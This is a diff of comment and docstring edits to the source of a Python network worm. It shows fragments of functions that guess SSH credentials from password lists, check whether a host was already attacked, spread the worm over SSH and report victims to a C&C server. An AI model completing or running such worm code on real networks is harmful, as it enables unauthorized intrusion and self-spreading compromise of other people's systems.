@@ -23,7 +23,8 @@ from pyroute2 import IPRoute
 # Location of the worm (on infected hosts)
 LOCAL_TMP_DIRECTORY = "/tmp/networm/"
 # Install python3 and other requirements (necessarry if the hosts have not been prepared for the worm execution)
-# Set to false if the worm runs in an isolated network without Internet connection
+# Set to false if the worm runs in an isolated network without Internet connection.
+# In this case, the required resources should be preinstalled. 
 INSTALL_REQUIREMENTS = False
 # Allow the worm to scan these subnets
 INCLUDED_SUBNETS = ["192.168.0.0/16", "192.169.0.0/16"]
@@ -118,7 +119,6 @@ def send_victim_log(local_address_list):
     Send victim log to C&C Server
 
     :param local_address_list: list of local addresses
-    :return:
     """
 
     ssh = paramiko.SSHClient()
@@ -238,8 +238,8 @@ def filter_allowed(address_list):
     """
     Filter existing IPAddress/IPNetwork list and return only addresses
     which are allowed by the INCLUDED/EXCLUDED_SUBNET parameter
-    :param address_list:
-    :return:
+    :param address_list: Unfiltered lists of hosts
+    :return: Filtered list of allowed hosts
     """
     allowed_list = []
     for address in address_list:
@@ -253,7 +253,7 @@ def allowed(address):
     Check if the subnet or address should be scanned
 
     :param subnet: subnet (IPNetwork) or address (IPAddress)
-    :return: Boolean
+    :return: address/subnet can be attacked (bool)
     """
     # check if subnet has been excluded
     for excluded_subnet in EXCLUDED_SUBNETS:
@@ -272,7 +272,6 @@ def connect_via_ssh(ip):
     Using password and username file to guess credentials
 
     :param ip: IP of the SSH Server
-    :return: -
     """
     ssh = paramiko.SSHClient()
     passwords = read_line_file(PASSWORD_LIST)
@@ -311,7 +310,7 @@ def check_if_already_attacked(ssh):
     If the LOCAL_TMP_DIRECTORY exists, the worm has probably already been executed or is running.
 
     :param ssh: Active SSH Connection
-    :return: Bool
+    :return: Hosts has already been attacked (bool)
     """
     sftp = ssh.open_sftp()
     try:
@@ -344,7 +343,6 @@ def spread(ssh):
     Spread and execute the worm to a host
 
     :param ssh: Active SSH Connection
-    :return: -
     """
     # check if the host has already been attacked and skip if true
     attacked = check_if_already_attacked(ssh)
